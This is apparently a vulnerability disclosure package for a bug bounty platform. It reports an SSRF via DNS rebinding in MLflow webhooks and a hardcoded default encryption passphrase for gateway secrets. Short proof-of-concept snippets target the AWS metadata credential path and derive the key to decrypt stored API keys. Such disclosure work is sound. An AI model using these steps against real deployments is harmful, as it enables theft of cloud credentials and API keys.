# MLflow Security Findings — huntr.com Submission Package
# Em nome do Senhor Jesus Cristo
# Date: 27 Mar 2026
# Target: mlflow/mlflow v3.11.1.dev0 (latest)
# Researcher: ElromSecurity / inteligenciaartificial.now@gmail.com

---

## FINDING 1 [HIGH — $1,500]: SSRF via DNS Rebinding in Webhook Delivery

**Files**: `mlflow/webhooks/delivery.py` lines 152, 186; `mlflow/utils/validation.py` lines 733-780
**Type**: Server-Side Request Forgery (SSRF)
**CWE**: CWE-918, CWE-367 (TOCTOU)

### Description
The webhook delivery system validates webhook URLs by resolving the hostname via `socket.getaddrinfo()` and checking that all IPs are global (public). However, the actual HTTP POST request at line 186 performs a SEPARATE DNS resolution. An attacker exploits DNS rebinding:

1. First DNS query (validation): Returns public IP → passes `ip.is_global` check
2. Second DNS query (HTTP request): Returns `169.254.169.254` → hits AWS metadata

### Vulnerable Code
```python
# delivery.py line 152 - DNS resolution #1 (validation)
_validate_webhook_url(webhook.url)

# ... build payload ...

# delivery.py line 186 - DNS resolution #2 (can resolve differently!)
return session.post(webhook.url, data=payload_bytes, headers=headers, timeout=timeout)
```

```python
# validation.py lines 761-780
addr_infos = socket.getaddrinfo(hostname, None)  # Resolution #1
for addr_info in addr_infos:
    ip = ipaddress.ip_address(addr_info[4][0])
    if not ip.is_global:
        raise ...  # Only checked ONCE
```

### PoC
```python
# Set up DNS rebinding domain (rbndr.us) alternating public IP and 169.254.169.254
REBINDING_URL = "https://01020304.a9fea9fe.rbndr.us/latest/meta-data/iam/security-credentials/"

# Create webhook pointing to rebinding URL
requests.post(f"{MLFLOW_URL}/api/2.0/mlflow/webhooks/create", json={
    "name": "ssrf-poc", "url": REBINDING_URL,
    "events": [{"entity": "REGISTERED_MODEL", "action": "CREATED"}],
})
# Trigger webhook → hits AWS metadata service
```

### Impact
Cloud credential theft via metadata service, internal network scanning, access to internal services.

### Fix
Pin resolved IP from validation and use it for the actual HTTP request.

---

## FINDING 2 [HIGH — $1,500]: Hardcoded Default Encryption Key for Gateway Secrets

**Files**: `mlflow/utils/crypto.py` lines 30, 59, 158-168; `mlflow/server/handlers.py` lines 5609-5614
**Type**: Hardcoded Cryptographic Key
**CWE**: CWE-798, CWE-321

### Description
The MLflow Gateway encryption system uses AES-256-GCM with PBKDF2-derived KEK to protect API keys. But `KEKManager` falls back to a HARDCODED, publicly-known default passphrase when `MLFLOW_CRYPTO_KEK_PASSPHRASE` env var is not set:

```python
# crypto.py line 30
DEFAULT_KEK_PASSPHRASE = "mlflow-default-kek-passphrase-for-development-only"

# crypto.py line 59
MLFLOW_KEK_SALT = b"mlflow-secrets-kek-v1-2025"
```

Additionally, an UNAUTHENTICATED endpoint reveals if default passphrase is in use:
```python
# handlers.py line 5609-5614 → /ajax-api/3.0/mlflow/gateway/secrets/config
def _get_secrets_config():
    return jsonify({
        "secrets_available": True,
        "using_default_passphrase": kek_manager.using_default_passphrase,
    })
```

### Impact
Any attacker with database read access (SQLi, backup exposure, shared hosting) can decrypt ALL stored gateway secrets (OpenAI API keys, Anthropic keys, AWS creds) using the publicly-known default passphrase + salt + algorithm.

### PoC
```python
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Derive KEK using publicly known values
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32,
    salt=b"mlflow-secrets-kek-v1-2025" + (1).to_bytes(4, "big"),
    iterations=600_000)
kek = kdf.derive(b"mlflow-default-kek-passphrase-for-development-only")

# Unwrap DEK, decrypt secret from database → ALL API keys revealed
```

---

## SUMMARY

| # | Finding | Severity | Est. Bounty |
|---|---------|----------|-------------|
| 1 | SSRF via DNS Rebinding in Webhooks | HIGH | $1,500 |
| 2 | Hardcoded Default Encryption Key | HIGH | $1,500 |

**TOTAL POTENTIAL: $3,000**
